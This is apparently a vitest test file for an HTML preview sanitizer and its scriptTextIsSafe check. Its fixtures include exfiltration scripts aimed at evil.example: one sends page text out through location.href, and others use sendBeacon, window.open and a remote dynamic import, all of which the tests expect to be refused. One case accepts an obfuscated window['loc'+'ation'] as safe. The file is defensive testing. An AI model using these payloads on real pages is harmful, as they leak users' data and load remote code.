
import { describe, it, expect } from "vitest";
import { sanitizePreviewHtml, scriptTextIsSafe } from "../html-preview-artifacts";

const DOC = `<!doctype html><html><body>
<div id="v" onclick="document.getElementById('v').textContent='42'">hover</div>
<script>const s=[1,2,3];document.getElementById('v').textContent=s.length;</script>
<script src="https://cdn.example/chart.js"></script>
<img src="https://evil.example/pixel.png">
<a href="https://evil.example">x</a>
</body></html>`;

describe("sanitizePreviewHtml — default (no option) is unchanged", () => {
  it("strips scripts and handlers", () => {
    const r = sanitizePreviewHtml(DOC);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.html).not.toMatch(/<script/);
    expect(r.html).not.toMatch(/onclick/);
    expect(r.html).not.toMatch(/evil\.example/);
  });
});

describe("sanitizePreviewHtml — allowScripts", () => {
  it("keeps inline scripts and handlers, still drops external src/href", () => {
    const r = sanitizePreviewHtml(DOC, { allowScripts: true });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.html).toMatch(/<script>const s=\[1,2,3\]/);
    expect(r.html).toMatch(/onclick="document\.getElementById/);
    expect(r.html).not.toMatch(/cdn\.example/);
    expect(r.html).not.toMatch(/evil\.example/);
  });

  it("refuses a script or handler that reaches for the navigation channel", () => {
    for (const bad of [
      `<script>location.href='https://evil.example/?d='+document.body.innerText</script>`,
      `<script>window.open('https://evil.example')</script>`,
      `<script>top.postMessage(1,'*')</script>`,
      `<div onclick="parent.location='x'">x</div>`,
      `<script>navigator.sendBeacon('https://evil.example', 'd')</script>`,
      `<script>import('https://evil.example/m.js')</script>`,
    ]) {
      const r = sanitizePreviewHtml(`<div>ok</div>${bad}`, { allowScripts: true });
      expect(r.ok, bad).toBe(false);
      if (!r.ok) expect(r.reason).toBe("artifact_unsafe");
    }
  });

  it("scriptTextIsSafe: ordinary DOM/SVG code passes, string.replace is fine", () => {
    expect(scriptTextIsSafe("const el=document.querySelector('#a'); el.textContent=x.toFixed(1).replace('.',',');")).toBe(true);
    expect(scriptTextIsSafe("setInterval(()=>{r.setAttribute('width', w+=1)}, 16)")).toBe(true);
    expect(scriptTextIsSafe("const l = window['loc'+'ation']")).toBe(true);
  });
});
